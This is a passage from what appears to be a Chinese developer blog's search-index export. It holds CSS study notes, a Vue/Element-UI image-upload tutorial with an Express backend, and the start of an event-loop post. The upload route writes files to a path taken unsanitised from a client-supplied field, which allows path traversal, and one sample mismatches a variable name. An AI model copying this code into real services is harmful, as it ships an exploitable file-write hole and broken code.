punctuation">;</span><span class="token punctuation">}</span></code></pre></li></ul></li><li>CSS外边距合并：当两个垂直外边距相遇时，它们将形成一个外边距；合并后的外边距的高度等于两个发生合并的外边距的高度中的较大者</li><li>只有普通文档流中块框的垂直外边距才会发生外边距合并。行内框、浮动框或绝对定位之间的外边距不会合并</li></ul><h4 id="CSS定位"><a href="#CSS定位" class="headerlink" title="CSS定位"></a>CSS定位</h4><ul><li>CSS 有三种基本的定位机制：普通流、浮动和绝对定位</li><li><code>position</code><ul><li><code>static</code>：该框是一个常规框，布局根据常规流。’left’ 、’right’、’bottom’ 和 ‘top’ 属性不适用</li><li><code>relative</code>：框的位置根据常规流计算（被称为常规流中的位置）。然后框相对于它的常规位置而偏移</li><li><code>absolute</code>：框的位置（可能还有它的尺寸）是由’left’，’right’，’top’和’bottom’特性决定；绝对定位的框从常规流向中脱离。这意味着它们对其后的兄弟元素的定位没有影响</li><li><code>fixed</code>：框相对于可视窗口固定，滚动时不移动</li></ul></li><li>偏移：<code>top</code>、<code>right</code>、<code>bottom</code>、<code>left</code></li><li><code>overflow</code>：设置当元素的内容溢出其区域时发生的事情</li><li><code>clip</code>：设置元素的形状。元素被剪入这个形状之中，然后显示出来</li><li><code>vertical-align</code>：设置元素的垂直对齐方式<br><img src="/img/in-post/css-05.JPG" alt="value"></li><li>浮动：浮动的框可以向左或向右移动，直到它的外边缘碰到包含框或另一个浮动框的边框为止；由于浮动框不在文档的普通流中，所以文档的普通流中的块框表现得就像浮动框不存在一样</li></ul><h4 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h4><ul><li>元素选择器</li><li>类选择器</li><li>通配符选择器</li><li>ID选择器</li><li>属性选择器<code>[title]</code><br><img src="/img/in-post/css-06.JPG" alt="value"></li><li>后代选择器</li><li>子元素选择器<code>&gt;</code></li><li>相邻兄弟选择器<code>+</code>：可选择紧接在另一元素后的元素，且二者有相同父元素</li><li>伪类：<code>first-child | last-child | first-of-type | last-of-type | active | focus | hover | link | visited</code></li><li>伪元素<br><img src="/img/in-post/css-08.JPG" alt="value"></li><li>CSS3下伪类和伪元素的区别<ul><li>伪类其实是弥补了CSS选择器的不足，用来更方便地获取信息</li><li>伪元素本质上是创建了一个虚拟容器(元素)，我们可以在其中添加内容或样式</li><li>CSS3中伪元素用双冒号</li></ul></li></ul><h4 id="CSS3新特性"><a href="#CSS3新特性" class="headerlink" title="CSS3新特性"></a>CSS3新特性</h4><ul><li>主要模块：选择器、框模型、背景和边框、文本效果、2D/3D 转换、动画、多列布局、用户界面</li><li>边框：<ul><li><code>border-radius</code>：圆角边框</li><li><code>box-shadow</code>：边框阴影</li><li><code>border-image</code>：边框图片</li></ul></li><li>背景<ul><li><code>background-size</code>：背景图片的尺寸</li><li><code>background-origin</code>：规定背景图片的定位区域 content-box、padding-box 或 border-box</li><li>允许多重背景图片，多个url通过逗号分隔</li><li><code>background-clip</code>：规定背景的绘制区域 <code>border-box|padding-box|content-box</code></li></ul></li><li>文本效果<ul><li><code>text-shadow</code>：规定水平阴影、垂直阴影、模糊距离，以及阴影的颜色</li><li><code>word-wrap</code>：允许长单词或 URL 地址换行到下一行normal|break-word</li></ul></li><li>自定义字体<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css"><span class="token atrule"><span class="token rule">@font-face</span></span><span class="token punctuation">{</span>  <span class="token property">font-family</span><span class="token punctuation">:</span> myFirstFont<span class="token punctuation">;</span>  <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url">url('Sansation_Light.ttf')</span>,<span class="token url">url('Sansation_Light.eot')</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* IE9+ */</span><span class="token punctuation">}</span><span class="token selector">div</span><span class="token punctuation">{</span>  <span class="token property">font-family</span><span class="token punctuation">:</span>myFirstFont<span class="token punctuation">;</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre></li><li>2D转换transform<br><img src="/img/in-post/css-09.JPG" alt="value"></li><li>3D转换transform<br><img src="/img/in-post/css-10.JPG" alt="value"></li><li>过渡transition<ul><li>规定您希望把效果添加到哪个 CSS 属性上</li><li>规定效果的时长</li></ul></li><li>CSS动画<br><img src="/img/in-post/css-11.JPG" alt="value"></li><li>多列<br><img src="/img/in-post/css-12.JPG" alt="value"></li><li>用户界面<ul><li><code>resize</code>: 规定是否可由用户调整元素的尺寸 <code>none | both | horizontal | vertical</code></li><li><code>box-sizing</code>：以特定的方式定义匹配某个区域的特定元素</li></ul></li></ul><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li>单行文本溢出<pre><code>overflow: hidden;text-overflow: ellipsis;white-space: nowrap;</code></pre></li><li>多行文本溢出<pre><code>display: -webkit-box;-webkit-box-orient: vertical;-webkit-line-clamp: 3;overflow: hidden;</code></pre></li></ul><h4 id="Flex布局"><a href="#Flex布局" class="headerlink" title="Flex布局"></a>Flex布局</h4><ul><li>CSS3 弹性盒子(Flex Box)：是一种当页面需要适应不同的屏幕大小以及设备类型时确保元素拥有恰当的行为的布局方式。目的是提供一种更加有效的方式来对一个容器中的子元素进行排列、对齐和分配空白空间。</li><li>设置<pre><code>{display: -webkit-flex; /* Safari */display: flex;}//行内元素{display: inline-flex;}</code></pre><ul><li>设为 Flex 布局以后，子元素的float、clear和vertical-align属性将失效</li><li>容器上的属性：<ul><li><code>flex-direction</code>:<code>row | row-reverse | column | column-reverse</code></li><li><code>flex-wrap</code>:<code>nowrap | wrap | wrap-reverse</code></li><li><code>flex-flow</code>:<code>&lt;flex-direction&gt; &lt;flex-wrap&gt;</code>前两个属性的简写</li><li><code>justify-content</code>:<code>flex-start | flex-end | center | space-between | space-around</code> 项目在主轴上的对齐方式</li><li><code>align-item</code>：<code>flex-start | flex-end | center | baseline | stretch</code> 定义项目在交叉轴上如何对齐</li><li><code>align-content</code>:<code>flex-start | flex-end | center | space-between | space-around | stretch</code> 定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用</li></ul></li><li>项目上的属性<ul><li><code>order</code>:<code>&lt;integer&gt;</code>定义项目的排列顺序，数值越小，排列越靠前，默认为0</li><li><code>flex-grow</code>:<code>&lt;number&gt;</code>定义项目的方法比例</li><li><code>flex-shrink</code>:<code>&lt;number&gt;</code>定义项目的缩小比例</li><li><code>flex-basis</code>:<code>&lt;length&gt; | auto</code>项目占据的主轴空间</li><li><code>flex</code>前三个属性的简写</li><li><code>align-self</code>:<code>auto | flex-start | flex-end | center | baseline | stretch</code>允许单个项目有与其他项目不一样的对齐方式，可覆盖align-items属性</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Element-ui+Vue实现图片上传组件</title>
      <link href="/2018/08/08/element-ui-vue-shi-xian-tu-pian-shang-chuan-zu-jian/"/>
      <url>/2018/08/08/element-ui-vue-shi-xian-tu-pian-shang-chuan-zu-jian/</url>
      
        <content type="html"><![CDATA[<blockquote><p>talk is cheap show me the code</p></blockquote><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ol><li><a href="http://element-cn.eleme.io/#/zh-CN/component/upload" target="_blank" rel="noopener">element-ui</a></li><li><a href="https://segmentfault.com/a/1190000014137083" target="_blank" rel="noopener">vue前端(element-ui)，express后端实现上传图片到七牛云</a></li></ol><h4 id="前端组件"><a href="#前端组件" class="headerlink" title="前端组件"></a>前端组件</h4><ol><li>具体的样式配置可以见element-ui的官网</li><li><p>第一种配置：选择图片后直接上传(action是服务器地址，http-request是上传到服务器前拦截request进行处理的操作)：</p><pre class=" language-javascript"><code class="language-javascript"> <span class="token operator">&lt;</span>el<span class="token operator">-</span>upload     <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"upload-demo"</span>     ref<span class="token operator">=</span><span class="token string">"upload"</span>     <span class="token punctuation">:</span>action<span class="token operator">=</span>domain     <span class="token punctuation">:</span>http<span class="token operator">-</span>request<span class="token operator">=</span>uploadImage     <span class="token punctuation">:</span>file<span class="token operator">-</span>list<span class="token operator">=</span><span class="token string">"fileList"</span>     list<span class="token operator">-</span>type<span class="token operator">=</span><span class="token string">"picture-card"</span>     <span class="token punctuation">:</span>before<span class="token operator">-</span>upload<span class="token operator">=</span><span class="token string">"beforeUpload"</span>     multiple<span class="token operator">></span>     <span class="token operator">&lt;</span>i <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"el-icon-plus"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>i<span class="token operator">></span>     <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"el-upload__tip"</span> slot<span class="token operator">=</span><span class="token string">"tip"</span><span class="token operator">></span>只能上传jpg<span class="token operator">/</span>png文件，且不超过500kb<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">/</span>el<span class="token operator">-</span>upload<span class="token operator">></span></code></pre><p> 一个参考的uploadImage()函数配置(这里主要需要重命名图片名，我使用mongoose的Types生成一个唯一的ObjectId来进行重命名，也可以使用时间戳等方式)：</p><pre class=" language-javascript"><code class="language-javascript"> <span class="token keyword">async</span> <span class="token function">uploadImage</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">const</span> config <span class="token operator">=</span> <span class="token punctuation">{</span>         headers<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'multipart/form-data'</span><span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token punctuation">;</span>     <span class="token keyword">let</span> filetype <span class="token operator">=</span> <span class="token string">''</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>file<span class="token punctuation">.</span>type <span class="token operator">===</span> <span class="token string">'image/png'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         filetype <span class="token operator">=</span> <span class="token string">'png'</span>     <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>         filetype <span class="token operator">=</span> <span class="token string">'jpg'</span>     <span class="token punctuation">}</span>     <span class="token keyword">const</span> keyName <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>bucket <span class="token operator">+</span>  <span class="token string">"-"</span> <span class="token operator">+</span> Types<span class="token punctuation">.</span><span class="token function">ObjectId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>  <span class="token string">'.'</span> <span class="token operator">+</span> fileType<span class="token punctuation">;</span>     <span class="token keyword">const</span> formdata <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     formdata<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>     formdata<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> keyName<span class="token punctuation">)</span><span class="token punctuation">;</span>     axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/api/uploadImage'</span><span class="token punctuation">,</span> formdata<span class="token punctuation">,</span> config<span class="token punctuation">)</span>     <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>         <span class="token keyword">this</span><span class="token punctuation">.</span>fileList<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>             name<span class="token punctuation">:</span> res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>name<span class="token punctuation">,</span>             url<span class="token punctuation">:</span> res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>url<span class="token punctuation">,</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'image upload succeed.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span>     <span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span>err <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>         console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span>message<span class="token punctuation">)</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre><p> 注意到：我们如果将图片上传到一个跨域服务器是需要进行跨域处理的，后面我们就可以使用’/api’代替服务器地址。<br> ① 在Vue中我们可以修改config/index.js：</p><pre class=" language-javascript"><code class="language-javascript"> proxyTable<span class="token punctuation">:</span> <span class="token punctuation">{</span>     <span class="token string">'/api'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>         target<span class="token punctuation">:</span> <span class="token string">'https://example.com'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 接口的域名</span>         secure<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 如果是https接口，需要配置这个参数</span>         changeOrigin<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 如果接口跨域，需要进行这个参数配置</span>         pathRewrite<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'^/api'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre><p> ② 在Nuxt中我们可以配置nuxt.config.js：</p><pre class=" language-javascript"><code class="language-javascript"> modules<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'@nuxtjs/axios'</span><span class="token punctuation">,</span><span class="token string">'@nuxtjs/proxy'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> proxy<span class="token punctuation">:</span> <span class="token punctuation">[</span>     <span class="token string">'/api'</span><span class="token punctuation">,</span>     <span class="token punctuation">{</span>         target<span class="token punctuation">:</span> <span class="token string">'https://example.com'</span><span class="token punctuation">,</span>         pathRewrite<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'^/api'</span><span class="token punctuation">:</span> <span class="token string">'/'</span><span class="token punctuation">}</span>     <span class="token punctuation">}</span> <span class="token punctuation">]</span><span class="token punctuation">,</span></code></pre></li><li><p>另一种配置：点击上传按钮后才上传到服务器(主要将上传组件的<code>:auto-upload</code>设置为<code>false</code>)。如果要实现图片预览可以添加一个处理函数<code>:on-change=&quot;handleSuccess&quot;</code>：    </p><pre class=" language-javascript"><code class="language-javascript"> <span class="token function">handleSuccess</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> files<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">this</span><span class="token punctuation">.</span>fileList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//因为我这里每次上传只选择一张图片，所以清空</span>     <span class="token keyword">let</span> file <span class="token operator">=</span> files<span class="token punctuation">[</span>files<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">let</span> name <span class="token operator">=</span> file<span class="token punctuation">.</span>name<span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">beforeUpload</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>raw<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">let</span> imageUrl <span class="token operator">=</span> window<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>raw<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">this</span><span class="token punctuation">.</span>imageFile <span class="token operator">=</span> file<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//保存imageFile</span>         <span class="token keyword">this</span><span class="token punctuation">.</span>fileList<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>name<span class="token punctuation">:</span> name<span class="token punctuation">,</span> url<span class="token punctuation">:</span> imageUrl<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre><p> 上传到七牛云可以uploadImage()函数进行修改：</p><pre class=" language-javascript"><code class="language-javascript"> <span class="token keyword">try</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">//获取上传凭证token</span>     <span class="token keyword">let</span> uptoken <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token string">'getUploadToken'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">const</span> formdata <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     formdata<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>imageFile<span class="token punctuation">.</span>raw<span class="token punctuation">)</span><span class="token punctuation">;</span>     formdata<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> uptoken<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//添加凭证</span>     formdata<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> keyName<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> reject<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>         axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/upQiniu'</span><span class="token punctuation">,</span> formdata<span class="token punctuation">,</span> config<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>res <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>         <span class="token keyword">this</span><span class="token punctuation">.</span>imageUrl <span class="token operator">=</span> <span class="token string">'http://'</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>qiniuaddr <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>data<span class="token punctuation">.</span>key<span class="token punctuation">;</span>         <span class="token keyword">this</span><span class="token punctuation">.</span>fileList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">this</span><span class="token punctuation">.</span>imageFile <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>         <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>imageUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'post failed!'</span> <span class="token operator">+</span> e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span></code></pre><p> 后面我们要上传可以直接调用uploadImage函数异步返回图片上传后的路径</p></li></ol><h4 id="后端配置"><a href="#后端配置" class="headerlink" title="后端配置"></a>后端配置</h4><ol><li>上传到七牛云，为了避免暴露密钥，凭证token应该从后端获取：<pre class=" language-javascript"><code class="language-javascript"> <span class="token keyword">const</span> qiniu <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'qiniu'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//util/onfig/qiniu.js中放置七牛云的访问key和密钥</span> <span class="token keyword">import</span> <span class="token punctuation">{</span>accessKey<span class="token punctuation">,</span> secretKey<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../util/config/qiniu'</span> <span class="token comment" spellcheck="true">//例如我在Vuex Store的action中添加了以下函数</span> <span class="token function">getUploadToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">const</span> mac <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">qiniu<span class="token punctuation">.</span>auth<span class="token punctuation">.</span>digest<span class="token punctuation">.</span>Mac</span><span class="token punctuation">(</span>accessKey<span class="token punctuation">,</span> secretKey<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">const</span> options <span class="token operator">=</span> <span class="token punctuation">{</span>         scope<span class="token punctuation">:</span> <span class="token string">'xxxxx'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//你在七牛云的空间名字</span>     <span class="token punctuation">}</span><span class="token punctuation">;</span>     <span class="token keyword">const</span> putPolicy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">qiniu<span class="token punctuation">.</span>rs<span class="token punctuation">.</span>PutPolicy</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> putPolicy<span class="token punctuation">.</span><span class="token function">uploadToken</span><span class="token punctuation">(</span>mac<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">,</span></code></pre></li><li>上传到本地文件夹，express+multiparty配置图片上传服务器:<pre class=" language-javascript"><code class="language-javascript"> router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/uploadImage'</span><span class="token punctuation">,</span> <span class="token keyword">async</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> <span class="token keyword">var</span> form <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">multiparty<span class="token punctuation">.</span>Form</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> form<span class="token punctuation">.</span>uploadDir <span class="token operator">=</span> config<span class="token punctuation">.</span>imagePath<span class="token punctuation">;</span> form<span class="token punctuation">.</span>maxFieldsSize <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">;</span> <span class="token keyword">var</span> newName<span class="token punctuation">;</span> <span class="token keyword">await</span> form<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> <span class="token punctuation">(</span>err<span class="token punctuation">,</span> fields<span class="token punctuation">,</span> files<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>     <span class="token keyword">if</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>message<span class="token punctuation">:</span> <span class="token string">"upload image failed: "</span> <span class="token operator">+</span> err<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     newName <span class="token operator">=</span> fields<span class="token punctuation">.</span>key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//因为element-ui每次上传一张图片，所以这里考虑取出第一个即可</span>     <span class="token keyword">let</span> newPath <span class="token operator">=</span> config<span class="token punctuation">.</span>imagePath <span class="token operator">+</span> newName<span class="token punctuation">;</span>     <span class="token keyword">let</span> originalPath <span class="token operator">=</span> files<span class="token punctuation">.</span>file<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>path<span class="token punctuation">;</span>     <span class="token keyword">try</span> <span class="token punctuation">{</span>         fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>originalPath<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//本地图片路径是否存在</span>         fs<span class="token punctuation">.</span><span class="token function">renameSync</span><span class="token punctuation">(</span>originalPath<span class="token punctuation">,</span>newPath<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//重命名，这里最好使用renameSync强制命名</span>         <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>name<span class="token punctuation">:</span> newName<span class="token punctuation">,</span> url<span class="token punctuation">:</span> config<span class="token punctuation">.</span>imageURL <span class="token operator">+</span> newName<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>message<span class="token punctuation">:</span> <span class="token string">"upload image failed: "</span> <span class="token operator">+</span> error<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="一些难点"><a href="#一些难点" class="headerlink" title="一些难点"></a>一些难点</h4>一个是上传的formdata配置，注意配置config，如果上传失败检查request中的formdata是否为空；另一个是跨域配置。</li></ol><hr><p>一个小记录，欢迎指教</p>]]></content>
      
      
      <categories>
          
          <category> 技术总结 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>js事件执行机制</title>
      <link href="/2018/08/05/js-shi-jian-zhi-xing-ji-zhi/"/>
      <url>/2018/08/05/js-shi-jian-zhi-xing-ji-zhi/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/EventLoop" target="_blank" rel="noopener">事件循环</a></li><li><a href="https://www.youtube.com/watch?v=6MXRNXXgP_0" target="_blank" rel="noopener">Philip Roberts Help I’m stuck in an event loop</a></li><li><a href="https://juejin.im/post/59e85eebf265da430d571f89" target="_blank" rel="noopener">这一次，彻底弄懂 JavaScript 执行机制</a></li><li><a href="https://juejin.im/post/5b35cdfa51882574c020d685#comment" target="_blank" rel="noopener">node基础面试事件环？微任务、宏任务</a></li></ul><h4 id="运行时概念"><a href="#运行时概念" class="headerlink" title="运行时概念"></a>运行时概念</h4><p><img src="/img/in-post/event-loop.png" alt="">  </p><ul><li><strong>栈</strong>：函数调用形成了一个栈帧。</li><li><strong>堆</strong>：对象被分配在一个堆中，即用以表示一个大部分非结构化的内存区域。</li><li><strong>队列</strong>：一个JavaScript运行时包含了一个待处理的消息队列。每个消息都有一个为了处理这个消息关联的函数。在事件循环期间的某个时刻，运行时总是从最先进入队列的一个消息开始处理队列中的消息。执行栈为空时，事件循环将会处理队列中的下一个消息。</li></ul><h4 id="任务队列与事件循环-浏览器"><a href="#任务队列与事件循环-浏览器" class="headerlink" title="任务队列与事件循环(浏览器)"></a>任务队列与事件循环(浏览器)</h4><p>JavaScript是运行于单线程环境中的，任务可以分为同步任务和异步任务。</p><ul><li>所有同步任务在主线程上执行，形成一个执行栈；</li><li>异步任务放置在”Event Table”，当异步任务有了结果(例如鼠标点击事件，定时器触发，XMLHttpRequest完成回调等时)时，它就进入事件队列；</li><li>当执行栈中的所有同步任务执行完毕，系统会调用任务队列中的函数进入主线程执行；</li><li>上述过程的不断重复，形成事件循环(Event Loop)  </li></ul><p>注意：nodejs的event是基于libuv，而浏览器的event loop则在html5的规范中明确定义，事件循环机制不同。</p><h4 id="定时器的理解"><a href="#定时器的理解" class="headerlink" 